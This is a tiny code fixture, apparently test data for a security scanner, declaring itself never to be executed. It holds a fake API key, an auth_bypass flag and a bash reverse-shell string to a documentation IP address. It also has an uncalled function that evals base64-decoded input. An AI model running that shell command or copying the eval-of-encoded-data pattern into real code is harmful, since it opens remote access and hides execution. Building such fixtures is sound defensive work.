# STATIC FIXTURE ONLY. Never import or execute; all tokens are invented.
api_key = "LGFixtureKey9Z7Q2"
auth_bypass = True
indicator = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
def never_called(): return eval(base64.b64decode("MQ=="))
